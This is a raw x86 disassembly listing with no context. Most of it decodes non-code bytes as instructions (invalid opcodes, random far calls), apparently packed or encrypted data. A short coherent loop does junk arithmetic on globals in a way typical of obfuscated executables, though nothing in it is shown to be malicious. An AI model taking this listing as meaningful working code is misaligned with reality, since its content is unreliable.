  4061fe:	or     esp,DWORD PTR [ebp-0x64]
  406201:	cli    
  406202:	ins    BYTE PTR es:[edi],dx
  406203:	push   ebp
  406204:	ins    BYTE PTR es:[edi],dx
  406205:	push   edi
  406206:	popa   
  406207:	int3   
  406208:	out    0x45,al
  40620a:	aaa    
  40620b:	pop    eax
  40620c:	(bad)  
  40620d:	into   
  40620e:	fwait
  40620f:	ror    BYTE PTR [edx-0x1d],0x30
  406213:	lahf   
  406214:	pop    eax
  406215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406216:	jp     0x406241
  406218:	sub    al,0x49
  40621b:	nop
  40621c:	adc    ebp,ecx
  40621e:	sti    
  40621f:	repnz es sub esp,0x5c
  406224:	and    al,0x5a
  406226:	mov    esp,ebx
  406228:	push   esi
  406229:	lock mov al,0x9d
  40622c:	adc    al,0x1f
  40622e:	sub    ch,bl
  406230:	pop    esi
  406231:	xchg   BYTE PTR [eax-0x6d],dl
  406234:	jp     0x40629d
  406236:	jno    0x4061fa
  406238:	arpl   WORD PTR [ecx+ecx*1+0x43],ax
  40623c:	cs push 0x18
  40623f:	data16 lahf 
  406241:	sbb    al,dl
  406243:	push   0xf0e386c7
  406248:	test   eax,0x4f209618
  40624d:	cmp    BYTE PTR [ecx+0x336e965f],bh
  406253:	dec    esi
  406254:	cli    
  406255:	addr16 sub eax,0xa535c764
  40625b:	(bad)  
  40625c:	daa    
  40625d:	(bad)  
  40625e:	mov    eax,0xff6ae4ba
  406263:	jne    0x4062bf
  406265:	push   edx
  406266:	and    esi,edx
  406268:	xchg   edx,eax
  406269:	push   0x4d
  40626b:	cmp    dl,dl
  40626d:	sub    ah,BYTE PTR [edx]
  40626f:	ss mov cl,0x46
  406272:	push   ecx
  406273:	jns    0x4062e5
  406275:	pop    ds
  406276:	js     0x406231
  406278:	jb     0x406251
  40627a:	add    BYTE PTR [ecx-0x22f989d1],ch
  406280:	push   eax
  406281:	jecxz  0x4062cd
  406283:	cmp    al,0x3b
  406285:	addr16 push eax
  406287:	or     eax,DWORD PTR [edi]
  406289:	dec    edx
  40628a:	call   0xc0ff:0xa5191e17
  406291:	mov    ebx,0x5278a78e
  406296:	lock ja 0x40624d
  406299:	mov    al,ds:0xf3604033
  40629e:	mov    dl,BYTE PTR [edx]
  4062a0:	xor    ecx,DWORD PTR [eax]
  4062a2:	mov    al,BYTE PTR [ecx+0x2aa56b3c]
  4062a8:	push   ecx
  4062a9:	not    BYTE PTR [edx+0x4d38124e]
  4062af:	xor    bh,BYTE PTR [edx-0x2616884]
  4062b5:	xchg   ecx,eax
  4062b6:	pop    ebp
  4062b7:	xlat   BYTE PTR ds:[ebx]
  4062b8:	addr16 dec ecx
  4062ba:	mov    ebx,0xdc7a7b07
  4062bf:	jo     0x40633a
  4062c1:	sub    edx,DWORD PTR [ecx-0x69d001bb]
  4062c7:	rcr    edx,cl
  4062c9:	xor    al,0x77
  4062cb:	pop    esp
  4062cc:	cmp    dh,ah
  4062ce:	in     al,0x39
  4062d0:	fist   DWORD PTR [esp+esi*1-0x7e4da4b2]
  4062d7:	and    dl,BYTE PTR [ecx+0x64a9930d]
  4062dd:	int    0x43
  4062df:	lahf   
  4062e0:	or     DWORD PTR cs:[edx],0x8b5660cf
  4062e7:	sbb    DWORD PTR [edx],edi
  4062e9:	push   0xe2359af3
  4062ee:	sbb    BYTE PTR [ebp+edx*2-0x1a1ff134],ah
  4062f5:	(bad)  
  4062f6:	xor    ch,al
  4062f8:	pop    ds
  4062f9:	aad    0xc5
  4062fb:	popa   
  4062fc:	adc    edx,DWORD PTR [ebp+ebx*4-0x1d]
  406300:	xchg   BYTE PTR [ebp-0x448c8894],ch
  406306:	xlat   BYTE PTR ds:[ebx]
  406307:	mov    dh,0xc7
  406309:	or     esp,DWORD PTR [ebp-0x36]
  40630c:	mov    edx,0xfc8b8a88
  406311:	xchg   ecx,eax
  406312:	shr    BYTE PTR [edi-0x3],1
  406315:	jge    0x406395
  406317:	call   0x6b7f:0xb6effd57
  40631e:	daa    
  40631f:	sahf   
  406320:	push   esi
  406321:	mov    eax,ds:0x71249407
  406326:	outs   dx,BYTE PTR ds:[esi]
  406327:	xor    DWORD PTR [edx],esp
  406329:	and    BYTE PTR [ebx+0x14335da2],bl
  40632f:	dec    eax
  406330:	dec    esp
  406331:	inc    esi
  406332:	leave  
  406333:	mov    ebp,0x8790d11d
  406338:	mov    WORD PTR [ebx-0x20],ss
  40633b:	jge    0x406355
  40633d:	mov    al,ds:0xef11090e
  406342:	sub    edi,DWORD PTR [ecx]
  406344:	jo     0x4062ef
  406346:	or     BYTE PTR [ebp+0x192513cb],dl
  40634c:	inc    edi
  40634d:	xchg   edi,eax
  40634e:	inc    esp
  40634f:	pop    esp
  406350:	push   ebp
  406351:	(bad)  
  406352:	out    0x91,eax
  406354:	push   ds
  406355:	mov    bl,0x44
  406357:	dec    esi
  406358:	rol    DWORD PTR [ecx-0x67c7d8c],cl
  40635e:	ins    DWORD PTR es:[edi],dx
  40635f:	mov    BYTE PTR [ecx],ah
  406361:	imul   ebp,DWORD PTR [esi],0xe4f71497
  406367:	jge    0x406365
  406369:	xlat   BYTE PTR ds:[ebx]
  40636a:	sbb    DWORD PTR [esi-0x76a3fbd6],edi
  406370:	loop   0x40632f
  406372:	dec    esi
  406373:	cli    
  406374:	outs   dx,BYTE PTR ds:[esi]
  406375:	and    esp,DWORD PTR [edi+0x7f]
  406378:	mov    ds:0xd31e650a,eax
  40637d:	das    
  40637e:	add    BYTE PTR [ecx+edx*1],cl
  406381:	sbb    ah,dl
  406383:	gs test eax,0xf6fa592e
  406389:	jae    0x406365
  40638b:	sub    eax,0xcd4ecc60
  406390:	mov    bh,0xf1
  406392:	(bad)  
  406393:	fnstsw WORD PTR [edi-0x133c6a0f]
  406399:	inc    eax
  40639a:	gs out dx,eax
  40639c:	adc    DWORD PTR [eax-0x62d8b5f0],ecx
  4063a2:	call   0xb56a:0x4e14d1c4
  4063a9:	dec    edx
  4063aa:	mov    ah,BYTE PTR [ebx]
  4063ac:	rcr    BYTE PTR [eax+edx*8-0x38],cl
  4063b0:	dec    ebx
  4063b1:	add    dh,BYTE PTR [edi+0x31]
  4063b4:	scas   eax,DWORD PTR es:[edi]
  4063b5:	cmc    
  4063b6:	aaa    
  4063b7:	test   al,0x46
  4063b9:	and    eax,0xfb6bc6fa
  4063be:	pop    esp
  4063bf:	jne    0x406355
  4063c1:	sbb    ebp,DWORD PTR [ebx+0x78]
  4063c4:	add    ebp,esi
  4063c6:	cmp    al,ah
  4063c8:	(bad)  
  4063c9:	push   ecx
  4063ca:	mov    ecx,0xd4107108
  4063cf:	fcos   
  4063d1:	push   ebp
  4063d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063d3:	push   0x6
  4063d5:	push   eax
  4063d6:	call   0x60aa:0xea1f0b27
  4063dd:	cmp    eax,0xff258167
  4063e2:	mov    dh,0xa
  4063e4:	push   edx
  4063e5:	je     0x4063fc
  4063e7:	ds pop ebx
  4063e9:	cwde   
  4063ea:	dec    edx
  4063eb:	jmp    0xeb1efff8
  4063f0:	nop
  4063f1:	jl     0x406404
  4063f3:	cmp    eax,0xb3bd57a
  4063f8:	jle    0x4063da
  4063fa:	xor    DWORD PTR [ecx],edi
  4063fc:	clc    
  4063fd:	mov    esi,0x16872091
  406402:	pop    ebx
  406403:	or     ah,BYTE PTR [ebp-0x57]
  406406:	nop
  406407:	das    
  406408:	imul   ecx,DWORD PTR [esi-0x319660f4],0x6f
  40640f:	popa   
  406410:	add    DWORD PTR [ecx+eiz*1],edx
  406413:	(bad)  
  406414:	scas   al,BYTE PTR es:[edi]
  406415:	dec    ebx
  406416:	int    0x53
  406418:	xchg   ecx,eax
  406419:	jb     0x40647d
  40641b:	repnz or eax,0x2d8556f8
  406421:	pop    ebp
  406422:	and    ebx,DWORD PTR [edx-0x1b7e05e0]
  406428:	sub    DWORD PTR [edx],edx
  40642a:	outs   dx,BYTE PTR ds:[esi]
  40642b:	stos   DWORD PTR es:[edi],eax
  40642c:	push   0xffffffff
  40642e:	push   0xf0ef711d
  406433:	imul   ebx,DWORD PTR [edx-0x4b537f3e],0x39
  40643a:	push   ds
  40643b:	and    DWORD PTR [eax+0x70],ebx
  40643e:	sti    
  40643f:	ins    BYTE PTR es:[edi],dx
  406440:	sub    al,0xad
  406442:	push   ecx
  406443:	add    eax,0x301936cf
  406449:	sbb    BYTE PTR [edx+0x5],dl
  40644c:	dec    edi
  40644d:	and    BYTE PTR [ecx-0x2b],al
  406450:	cld    
  406451:	scas   eax,DWORD PTR es:[edi]
  406452:	sub    DWORD PTR [ecx+0x234afdb1],edx
  406458:	in     eax,0x4d
  40645a:	lods   eax,DWORD PTR ds:[esi]
  40645b:	xor    DWORD PTR [esi],ebx
  40645d:	xchg   esi,eax
  40645e:	dec    edi
  40645f:	loopne 0x406446
  406461:	sar    DWORD PTR [eax-0x68],cl
  406464:	nop
  406465:	mov    eax,0x59e49142
  40646a:	push   ecx
  40646b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40646c:	jns    0x4064cf
  40646e:	cs dec edx
  406470:	jp     0x40643a
  406472:	add    al,0xad
  406474:	xchg   ah,dh
  406476:	inc    esp
  406477:	(bad)  
  406478:	jmp    0x2c0e3551
  40647d:	and    bh,BYTE PTR [eax-0x375f588c]
  406483:	(bad)  
  406485:	pop    di
  406487:	not    BYTE PTR [esi+0x66]
  40648a:	call   0x4fb3:0x86c425d2
  406491:	loope  0x406466
  406493:	add    bh,BYTE PTR [edi+0x5]
  406496:	in     eax,dx
  406497:	ret    
  406498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406499:	dec    edx
  40649a:	ret    
  40649b:	xchg   esp,eax
  40649c:	div    dl
  40649e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40649f:	sbb    BYTE PTR [esi+ecx*1-0x5a],al
  4064a3:	lahf   
  4064a4:	aad    0x3
  4064a6:	loopne 0x40643b
  4064a8:	cwde   
  4064a9:	xor    bh,dh
  4064ab:	mov    WORD PTR [ebp+edx*4-0x24],dx
  4064b0:	jbe    0x4064b3
  4064b2:	sub    cl,dl
  4064b4:	mov    ebp,0xe33f38c0
  4064b9:	out    0xcf,eax
  4064bb:	rcl    DWORD PTR [edi-0x57bf4d5b],0xb
  4064c2:	enter  0x3a54,0x17
  4064c6:	inc    ecx
  4064c7:	mov    bl,0x6b
  4064c9:	jp     0x4064ad
  4064cb:	fld    DWORD PTR [ebx-0x75]
  4064ce:	fsubr  QWORD PTR [esi+esi*4+0x3441eeb]
  4064d5:	loopne 0x40652b
  4064d7:	out    dx,eax
  4064d8:	(bad)  
  4064d9:	xchg   ebp,eax
  4064da:	jae    0x4064e0
  4064dc:	std    
  4064dd:	push   ss
  4064de:	pop    DWORD PTR [ecx+0x37]
  4064e1:	pop    esi
  4064e2:	scas   al,BYTE PTR es:[edi]
  4064e3:	mov    dh,0x4b
  4064e5:	jmp    0x406468
  4064e7:	xchg   esi,eax
  4064e8:	into   
  4064e9:	dec    esi
  4064ea:	mov    bl,0x4c
  4064ec:	dec    ebp
  4064ed:	or     dh,dh
  4064ef:	xchg   edi,eax
  4064f0:	mov    ss:0x759d2d73,eax
  4064f6:	xlat   BYTE PTR ds:[ebx]
  4064f7:	mov    ss,WORD PTR [edi]
  4064f9:	lds    edx,FWORD PTR [eax]
  4064fb:	cmp    al,BYTE PTR [esi]
  4064fd:	nop
  4064fe:	cdq    
  4064ff:	loop   0x40657d
  406501:	outs   dx,DWORD PTR ds:[esi]
  406502:	jne    0x40652c
  406504:	sub    al,BYTE PTR [edx+0x27]
  406507:	adc    ebp,ecx
  406509:	xchg   ecx,eax
  40650a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40650b:	push   esi
  40650c:	lods   al,BYTE PTR ds:[esi]
  40650d:	push   ss
  40650e:	and    al,0x46
  406510:	sub    eax,0xa0b0bff8
  406515:	fcmovu st,st(4)
  406517:	pop    ebx
  406518:	bound  ecx,QWORD PTR [edx-0x56]
  40651b:	ret    
  40651c:	push   ss
  40651d:	repnz pushf 
  40651f:	loop   0x4064f7
  406521:	or     eax,0x6c626206
  406526:	mov    ebx,0x51ecf49
  40652b:	ins    DWORD PTR es:[edi],dx
  40652c:	inc    esp
  40652d:	jg     0x4065a7
  40652f:	out    dx,eax
  406530:	in     al,dx
  406531:	shl    BYTE PTR [edx-0x7f],1
  406534:	(bad)  
  406535:	adc    BYTE PTR [ebp+0x70],dl
  406538:	(bad)  
  406539:	sar    BYTE PTR [ebx+0x62c9e80e],1
  40653f:	das    
  406540:	out    dx,eax
  406541:	mov    eax,0xf251595a
  406546:	int3   
  406547:	sub    BYTE PTR [edx-0x44],dl
  40654a:	fild   QWORD PTR [ecx+0x17001ab4]
  406550:	fisttp WORD PTR [ebp-0x32]
  406553:	push   cs
  406554:	add    bh,BYTE PTR [ecx]
  406556:	outs   dx,BYTE PTR ds:[esi]
  406557:	mov    ?,WORD PTR ds:0xd2402f45
  40655d:	stc    
  40655e:	ss sub al,0xab
  406561:	xchg   edx,eax
  406562:	dec    ecx
  406563:	xor    cl,0x28
  406566:	lock ror ebx,1
  406569:	cmp    DWORD PTR [ebp+0x16c0bb27],esp
  40656f:	(bad)  
  406570:	adc    eax,0xc041b123
  406575:	adc    DWORD PTR [esi-0x66],0x9
  406579:	ss or  al,0xe8
  40657c:	pop    ebx
  40657d:	adc    eax,0xd4d04ae1
  406582:	ins    DWORD PTR es:[edi],dx
  406583:	jl     0x4065ae
  406585:	addr16 in eax,dx
  406587:	inc    edi
  406588:	fnstenv [esi-0x1d]
  40658b:	bnd jb 0x406591
  40658e:	aaa    
  40658f:	scas   al,BYTE PTR es:[edi]
  406590:	std    
  406591:	das    
  406592:	mov    ?,WORD PTR [ebx-0x43]
  406595:	jl     0x406583
  406597:	cld    
  406598:	xchg   ebx,eax
  406599:	in     al,0xb0
  40659b:	int3   
  40659c:	es es je 0x4065b4
  4065a0:	cmp    dh,BYTE PTR [ebp-0x73]
  4065a3:	inc    ebp
  4065a4:	fmul   QWORD PTR [edi]
  4065a6:	mov    bh,0xd
  4065a8:	mov    ebx,0x23004345
  4065ad:	or     eax,0x4344f3
  4065b2:	mov    DWORD PTR ds:0x4345bb,ecx
  4065b8:	mov    DWORD PTR [ebp-0x28],eax
  4065bb:	adc    DWORD PTR ds:0x4344ff,ecx
  4065c1:	mov    eax,DWORD PTR [ebp+0x8]
  4065c4:	sbb    ecx,DWORD PTR ds:0x43460f
  4065ca:	mov    DWORD PTR [ebp-0x20],eax
  4065cd:	push   ebx
  4065ce:	sub    DWORD PTR ds:0x4344f7,ebx
  4065d4:	lea    eax,[ebp-0x18]
  4065d7:	mov    DWORD PTR [ebp-0x1c],eax
  4065da:	xor    DWORD PTR ds:0x43454f,edx
  4065e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4065e3:	and    DWORD PTR ds:0x4344eb,0x0
  4065ed:	mov    ecx,DWORD PTR ds:0x4344eb
  4065f3:	inc    ecx
  4065f4:	mov    DWORD PTR ds:0x4344eb,ecx
  4065fa:	cmp    DWORD PTR ds:0x4344eb,0x1e
  406601:	jne    0x40661a
  406607:	push   DWORD PTR [ebp-0x14]
  40660a:	push   0x434547
  40660f:	push   0x43481f
  406614:	call   DWORD PTR ds:0x413400
  40661a:	cmp    DWORD PTR ds:0x4344eb,0x1c
  406621:	jb     0x4065ed
  406627:	jmp    0x406a15
  40662c:	call   0x70d95cef
  406631:	mov    al,0x70
  406633:	dec    esi
  406634:	mov    BYTE PTR [ecx],dh
  406636:	push   esi
  406637:	inc    esp
  406638:	or     BYTE PTR [ecx+0x3b4c5b6e],ch
  40663e:	jle    0x4066be
  406640:	dec    edi
  406641:	jns    0x4066c1
  406643:	jle    0x4065f1
  406645:	push   0x2097c82d
  40664a:	pop    esi
  40664b:	(bad)  
  40664c:	ja     0x406674
  40664e:	push   edi
  40664f:	jae    0x4066aa
  406651:	out    dx,al
  406652:	int    0x7c
  406654:	push   0x4a25899e
  406659:	fisttp DWORD PTR [edi+0x3ad3f263]
  40665f:	or     BYTE PTR [edx-0x1d474905],cl
  406665:	push   ds
  406666:	cmp    al,0x94
  406668:	(bad)  
  406669:	int    0x74
  40666b:	cmp    sp,0xffc9
  40666f:	xor    DWORD PTR [esi],edx
  406671:	fisttp QWORD PTR [eax+0x6a12a10b]
  406677:	fstp   DWORD PTR [esi]
  406679:	fwait
  40667a:	retf   
  40667b:	imul   esp,ecx,0x7a
  40667e:	and    bh,BYTE PTR [esi]
  406680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406681:	gs and edx,ebx
  406684:	fldenv [ecx+0x7257b8cb]
  40668a:	mov    esp,DWORD PTR [ecx]
  40668c:	lock out dx,eax
  40668e:	push   esi
  40668f:	test   DWORD PTR [ebx],ecx
  406691:	mov    ds:0x97603bd7,eax
  406696:	push   ss
  406697:	xor    eax,DWORD PTR [ecx+0x516fee75]
  40669d:	cmp    DWORD PTR [edx],edi
  40669f:	(bad)  
  4066a0:	cmp    al,0xe3
  4066a2:	aam    0x70
  4066a4:	sub    ecx,eax
  4066a6:	cmp    cl,BYTE PTR ds:0xb0b0b36c
  4066ac:	fldenv [edi+0x1f]
  4066af:	and    ecx,DWORD PTR [ecx]
  4066b1:	push   esp
  4066b2:	adc    BYTE PTR [ebx-0x30e248d5],ah
  4066b8:	ror    DWORD PTR [esi-0x108d2a9a],0x8e
  4066bf:	or     al,0xa7
  4066c2:	outs   dx,BYTE PTR ds:[esi]
  4066c3:	shl    ebx,0xea
  4066c6:	jg     0x40664b
  4066c8:	les    ax,DWORD PTR [bx+di-0x4015]
  4066ce:	bound  edi,QWORD PTR [edi]
  4066d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066d1:	fidiv  WORD PTR [ebp+ebp*8-0x54]
  4066d5:	test   eax,0xcb1ab46e
  4066da:	mov    al,ds:0x3316d21d
  4066df:	daa    
  4066e0:	and    esp,DWORD PTR [ebx-0x35aae09d]
  4066e6:	test   DWORD PTR [eax],0x7262d6a5
  4066ec:	dec    esi
  4066ed:	mov    esp,0x91294fdd
  4066f2:	mov    cs,esi
  4066f4:	lea    ebp,ds:0x1061054
  4066fa:	fwait
  4066fb:	dec    ebp
  4066fc:	fimul  DWORD PTR [edi+edx*1+0x70]
  406700:	xchg   esi,eax
  406701:	les    ecx,FWORD PTR [eax+0x21ac4f36]
  406707:	(bad)  
  406708:	out    0x4e,eax
  40670a:	das    
  40670b:	add    al,0xd2
  40670d:	jmp    DWORD PTR [esp+ebp*2+0x307c9a49]
  406714:	(bad)  
  406715:	pop    ebx
  406716:	fimul  DWORD PTR [edx]
  406718:	jg     0x40673b
  40671a:	je     0x4066ec
  40671c:	cld    
  40671d:	jecxz  0x4066ac
  40671f:	int    0x2f
  406721:	in     al,dx
  406722:	stos   DWORD PTR es:[edi],eax
  406723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406724:	adc    BYTE PTR [edi+eiz*4-0x3a],bh
  406728:	mov    ebx,0xd7198fa6
  40672d:	(bad)  
  40672e:	xor    al,0xf1
  406730:	stos   DWORD PTR es:[edi],eax
  406731:	jmpw   0xb675
  406735:	aaa    
  406736:	adc    BYTE PTR [ecx+ecx*1+0x7098639a],ch
  40673d:	sbb    bl,BYTE PTR [edi-0x25a5395a]
  406743:	cmp    BYTE PTR ds:0xac88a57f,ah
  406749:	jl     0x406731
  40674b:	adc    cl,BYTE PTR [ebx+0x5789e816]
  406751:	in     eax,dx
  406752:	mov    esp,0x592d2144
  406757:	push   edi
  406758:	xlat   BYTE PTR ds:[ebx]
  406759:	xor    bh,BYTE PTR [ecx-0x72b58864]
  40675f:	push   edx
  406760:	in     eax,0x74
  406762:	mov    cl,BYTE PTR ds:0x8501d621
  406768:	cmp    ebp,DWORD PTR [eax]
  40676a:	xor    BYTE PTR [ebp-0x24471c],0xeb
  406771:	nop
  406772:	ret    
  406773:	add    esp,esi
  406775:	stos   BYTE PTR es:[edi],al
  406776:	retf   0xe478
  406779:	and    al,0x11
  40677b:	jle    0x40674c
  40677d:	jnp    0x4067f4
  40677f:	pop    ds
  406780:	jle    0x40674d
  406782:	cld    
  406783:	inc    esp
  406784:	aad    0x5c
  406786:	(bad)  [edx]
  406788:	(bad)  [ebp+0x7d]
  40678b:	cmp    bl,BYTE PTR [edx+0x79]
  40678e:	pop    ebx
  40678f:	add    BYTE PTR [esi-0x3753b1b4],ah
  406795:	pop    ds
  406796:	outs   dx,DWORD PTR es:[esi]
  406798:	(bad)  [ebx]
  40679a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40679b:	ds test eax,0x1cd877ed
  4067a1:	jg     0x406817
  4067a3:	and    al,0xc3
  4067a5:	mov    ch,0x82
  4067a7:	in     eax,0x45
  4067a9:	mov    dl,0x64
  4067ab:	shl    bl,1
  4067ad:	gs jno 0x4067bf
  4067b0:	add    eax,0x8124c2b6
  4067b5:	push   ds
  4067b6:	out    0x52,al
  4067b8:	lods   al,BYTE PTR ds:[esi]
  4067b9:	nop
  4067ba:	mov    al,0x54
  4067bc:	push   ecx
  4067bd:	pop    ds
  4067be:	mov    ebp,?
  4067c0:	call   0x3e78:0x5a800756
  4067c7:	scas   al,BYTE PTR es:[edi]
  4067c8:	jge    0x40675e
  4067ca:	je     0x40680e
  4067cc:	mov    dl,BYTE PTR [eax+esi*2]
  4067cf:	rol    BYTE PTR [ebx+0x3f],0x16
  4067d3:	sar    BYTE PTR [ecx+ebx*1],cl
  4067d6:	dec    edx
  4067d7:	mov    edi,DWORD PTR [eax+esi*4]
  4067da:	jmp    0x6819:0x89b3f317
  4067e1:	(bad)  
  4067e2:	sar    DWORD PTR [esi+0x47bc118b],1
  4067e8:	call   0xea85f94d
  4067ed:	mov    eax,0x55c044c1
  4067f2:	xchg   ebp,eax
  4067f3:	idiv   BYTE PTR [ecx+0x5376af08]
  4067f9:	arpl   WORD PTR [eax+0xa99952c],cx
  4067ff:	ret    
  406800:	retf   
  406801:	push   0xc5d9a9d8
  406806:	fs pop eax
  406808:	cwde   
  406809:	fadd   st,st(5)
  40680b:	ffreep st(3)
  40680d:	push   ss
  40680e:	test   eax,0x8f4458cb
  406813:	cmp    al,cl
  406815:	icebp  
  406816:	pop    ebp
  406817:	jl     0x4067a5
  406819:	rcr    BYTE PTR [ebx+0x19],1
  40681c:	in     eax,dx
  40681d:	jno    0x406840
  40681f:	push   ebx
  406820:	jb     0x40689d
  406822:	xchg   esi,eax
  406823:	jno    0x40688b
  406825:	shl    BYTE PTR [ebx+0x2cf8ca1c],1
  40682b:	ficomp WORD PTR [ebp-0xd]
  40682e:	mov    dl,0x83
  406830:	xchg   esi,eax
  406831:	jb     0x406839
  406833:	mov    edi,0xa96011a3
  406838:	and    BYTE PTR [edx+0x62d66d19],dh
  40683e:	dec    esp
  40683f:	pop    ds
  406840:	mov    edx,0xb0aca848
  406845:	mov    ds:0xb04944e5,al
  40684a:	dec    ebp
  40684b:	xchg   esi,eax
  40684c:	imul   ebx,DWORD PTR [ebx],0xffffffda
  40684f:	or     al,0xff
  406851:	mov    eax,ds:0xdb0e3f82
  406856:	repnz push ebp
  406858:	iret   
  406859:	mov    ds,ecx
  40685b:	imul   esi,DWORD PTR [ecx+0x27],0x3e61ec00
  406862:	mov    DWORD PTR [eax],ecx
  406864:	cmpxchg BYTE PTR [ebp+ebx*1+0x3b77cb29],dl
  40686c:	sub    al,0x91
  40686e:	mov    DWORD PTR [edi+ecx*2],ebx
  406871:	jno    0x40685d
  406873:	mov    esi,0x78119c57
  406878:	mov    BYTE PTR [ebx+0x61cae828],bl
  40687e:	fdiv   DWORD PTR [edi+ebp*1-0x76]
  406882:	shl    BYTE PTR [edi],0xbe
  406885:	clc    
  406886:	jno    0x406878
  406888:	adc    DWORD PTR [edi-0x33],ebx
  40688b:	sar    ebp,1
  40688d:	retf   
  40688e:	push   0x5283e80b
  406893:	push   0xd7173e9d
  406898:	jae    0x40687e
  40689a:	mov    ah,BYTE PTR [esi-0x1]
  40689d:	repz aad 0x1e
  4068a0:	je     0x406852
  4068a2:	shl    DWORD PTR ds:0x694163d7,cl
  4068a8:	push   0x5008e54a
  4068ad:	nop
  4068ae:	sbb    al,0x24
  4068b0:	ror    esp,0x31
  4068b3:	and    BYTE PTR [ecx-0x76],al
  4068b6:	(bad)  
  4068b8:	mov    bh,0xeb
  4068ba:	mov    ds:0xdd4c9e3,eax
  4068bf:	bound  edx,QWORD PTR [esi]
  4068c1:	mov    ecx,0x572a2b96
  4068c6:	retf   0xb534
  4068c9:	cmp    esp,DWORD PTR [ebp+0xb]
  4068cc:	xchg   ebx,eax
  4068cd:	xor    BYTE PTR [edi+0x66],bl
  4068d0:	rol    DWORD PTR [edx+0x18de5fb2],1
  4068d6:	fs pusha 
  4068d8:	ja     0x4068bb
  4068da:	sub    DWORD PTR [ebp-0x72],ebp
  4068dd:	and    DWORD PTR [ebx+0x1d0b520c],edi
  4068e3:	data16 mov al,ds:0x105974f0
  4068e9:	xchg   esp,eax
  4068ea:	cmp    eax,0x364e33b4
  4068ef:	push   ecx
  4068f0:	dec    eax
  4068f1:	(bad)
  4068f4:	pop    ebx
  4068f5:	mov    cs,eax
  4068f7:	xchg   esp,eax
  4068f8:	cmp    ch,0x63
  4068fb:	and    BYTE PTR [esi+eax*4+0x59],bl
  4068ff:	cmp    bh,BYTE PTR [ebx+ebx*4]
  406902:	xor    BYTE PTR [edi+0x56],0xb4
  406906:	or     al,0xf0
  406908:	or     eax,0x212c7049
  40690d:	push   ss
  40690e:	test   al,0xab
  406910:	ins    BYTE PTR es:[edi],dx
  406911:	xchg   BYTE PTR [ebp-0x19],al
  406914:	push   0x63190ce1
  406919:	leave  
  40691a:	pop    ebp
  40691b:	mov    esi,0x8f38bb43
  406920:	xchg   ebp,eax
  406921:	fldcw  WORD PTR [ebp+0x368588bd]
  406927:	(bad)  
  406928:	pop    esp
  406929:	xchg   BYTE PTR [eax-0x7aa38e08],bl
  40692f:	mov    BYTE PTR [edi],0x4e
  406932:	cdq    
  406933:	stos   DWORD PTR es:[edi],eax
  406934:	push   ecx
  406935:	retf   0xcfbe
  406938:	loope  0x406957
  40693a:	lea    ebx,[ecx]
  40693c:	adc    al,0x1b
  40693e:	(bad)  
  40693f:	jns    0x4068ee
  406941:	inc    edx
  406942:	mov    al,0xfd
  406944:	mov    esi,0x4a84dc33
  406949:	pop    esp
  40694b:	add    esi,ecx
  40694d:	in     eax,dx
  40694e:	int3   
  40694f:	or     al,0xc1
  406951:	jp     0x406964
  406953:	pop    ebx
  406954:	inc    esi
  406955:	mov    eax,ds:0x26441f53
  40695a:	sbb    eax,0x42457935
  40695f:	cmc    
  406960:	clc    
  406961:	xchg   edi,eax
  406962:	lods   eax,DWORD PTR ds:[esi]
  406963:	je     0x4069a2
  406965:	jmp    0x4069a5
  406967:	jb     0x40690f
  406969:	pop    ebp
  40696a:	in     eax,0x57
  40696c:	aam    0xa3
  40696e:	leave  
  40696f:	aam    0x91
  406971:	mov    ds:0x86793968,eax
  406976:	dec    eax
  406977:	inc    eax
  406978:	adc    al,0x8f
  40697a:	lock loop 0x406942
  40697d:	sub    BYTE PTR [esi+0x39],bh
  406980:	inc    eax
  406981:	mov    edx,0xc1c7a2c8
  406986:	inc    ebx
  406987:	mov    cl,0x1a
  406989:	dec    esi
  40698a:	add    esi,DWORD PTR [esi-0x59b864c1]
  406990:	popa   
  406991:	in     eax,0x32
  406993:	(bad)
  406996:	rcl    BYTE PTR [edx-0x78675746],cl
  40699c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40699d:	xchg   esi,eax
  40699e:	pop    esp
  40699f:	push   edi
  4069a0:	shl    DWORD PTR [bp+di+0x3b],cl
  4069a4:	and    ebx,DWORD PTR [ebx-0x5ff796ad]
  4069aa:	xchg   DWORD PTR [edx],edi
  4069ac:	adc    edx,DWORD PTR [ecx-0x2b]
  4069af:	mov    ebx,0x66f3a1ef
  4069b4:	test   eax,0x10b8ef0a
  4069b9:	mov    dl,0xa2
  4069bb:	loop   0x4069a6
  4069bd:	out    0x93,eax
  4069bf:	fcomp  DWORD PTR [ebp-0x3cdfde0e]
  4069c5:	sub    BYTE PTR [esi+0x39],al
  4069c8:	adc    dl,BYTE PTR [ecx]
  4069ca:	lock and BYTE PTR [eax-0x46],bh
  4069ce:	mov    al,0x4c
  4069d0:	mov    bh,0xfc
  4069d2:	data16 bnd jle 0x4069a6
  4069d6:	dec    eax
  4069d7:	(bad)  
  4069d8:	out    dx,al
  4069d9:	pop    edi
  4069da:	or     eax,0x7a836d
  4069df:	aas    
  4069e0:	add    al,0x86
  4069e2:	enterw 0x9e22,0x6e
  4069e7:	fndisi(8087 only) 
  4069e9:	push   cs
  4069ea:	mov    al,0x6d
  4069ec:	jns    0x406a57
  4069ee:	push   eax
  4069ef:	jmp    0xcd4d25c1
  4069f4:	cmp    ebx,DWORD PTR [edi-0x7c87f80c]
  4069fa:	ffree  st(7)
  4069fc:	dec    esp
  4069fd:	push   ebp
  4069fe:	fs (bad) 
  406a00:	iret   
  406a01:	scas   eax,DWORD PTR es:[edi]
  406a02:	jp     0x4069f6
  406a04:	addr16 cli 
  406a06:	dec    edi
  406a07:	outs   dx,DWORD PTR ds:[esi]
  406a08:	mov    ds:0x50d05a78,al
  406a0d:	std    
  406a0e:	js     0x406a3b
  406a10:	jmp    0x406a34
  406a12:	pop    esp
  406a13:	call   0xbff9:0x335756b4
  406a1a:	scas   al,BYTE PTR es:[edi]
  406a1b:	sub    eax,0x3889f89f
